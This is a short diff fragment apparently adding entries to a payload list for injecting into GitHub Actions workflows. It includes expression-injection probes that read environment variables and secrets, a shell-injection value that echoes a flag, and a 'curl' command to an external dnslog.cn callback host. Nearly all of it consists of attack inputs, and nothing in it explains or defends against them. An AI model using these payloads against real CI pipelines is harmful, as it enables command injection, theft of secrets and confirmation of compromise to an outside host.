@@ -635,3 +635,7 @@ ${{ env.flag }}
 ${{ env[FLAG] }}
 ${{ env.FLAG }}
 "; echo $flag"
+R1gelX29:${{ secret.FLAG }};
+Run curl fksb.sxhx72.dnslog.cn
+shell: /usr/bin/bash -e {0}
+rnm:
